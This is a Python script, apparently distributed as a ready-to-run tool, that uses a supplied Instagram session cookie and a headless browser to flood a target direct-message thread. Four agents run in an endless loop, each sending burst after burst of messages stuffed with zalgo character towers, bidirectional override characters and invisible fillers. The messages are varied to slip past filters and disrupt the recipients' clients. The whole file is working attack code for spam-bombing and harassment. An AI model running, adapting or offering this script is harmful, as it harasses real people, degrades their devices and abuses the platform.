# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (MATRIX STEALTH)
# 📅 STATUS: PERSISTENT-STRIKE | 20-MPS | DOCKER-READY

import os, asyncio, random, sys
from playwright.async_api import async_playwright

# --- NODE CONFIG ---
AGENT_COUNT = 4 
# --------------------

def get_variant_payload(agent_id):
    u_id = random.randint(100000, 999999)
    glue = "\u2060"
    styles = [("𝕻", "𝕬"), ("ℙ", "𝔸"), ("𝓟", "𝓐"), ("Ｐ", "Ａ")]
    s = styles[agent_id % len(styles)]
    
    header = f"👑_{s[0]}{s[1]}_ＰＡＰＡ_👑{glue}☣️_NODE_{os.environ.get('MACHINE_ID')}_☣️{glue}🆔_{u_id}{glue}"
    z_tower = "̸" * 195
    void_fill = "\u2800" * 45 
    
    body = []
    for i in range(155):
        bidi = ["\u2067\u202E", "\u2068\u202B", "\u202E\u2066"][i % 3]
        body.append(f"{bidi}{s[0]}{s[1]}_ＯＷＮＳ_{void_fill}{z_tower}\u202C\u2069")
    return (header + glue.join(body))[:9990]

async def run_striker(agent_id, context, target_id):
    page = await context.new_page()
    strike_count = 0
    
    while True: # ♾️ INFINITE PERSISTENCE LOOP
        try:
            print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Syncing...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded", timeout=90000)
            box = page.get_by_role("textbox", name="Message")
            await box.wait_for(state="visible", timeout=60000)

            while strike_count < 15:
                payload = get_variant_payload(agent_id)
                await box.fill(payload)
                await page.keyboard.press("Enter")
                strike_count += 1
                print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Hit {strike_count}")
                await asyncio.sleep(random.uniform(0.3, 0.6))
            
            strike_count = 0
            await asyncio.sleep(2) # Brief cooldown before refresh

        except Exception as e:
            print(f"⚠️ [Agent-{agent_id}] Connection lost, retrying in 5s...")
            await asyncio.sleep(5)

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()

    if not cookie or not target_id:
        print("❌ ERROR: Secrets not found. Check your GitHub Settings.")
        return

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])

        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
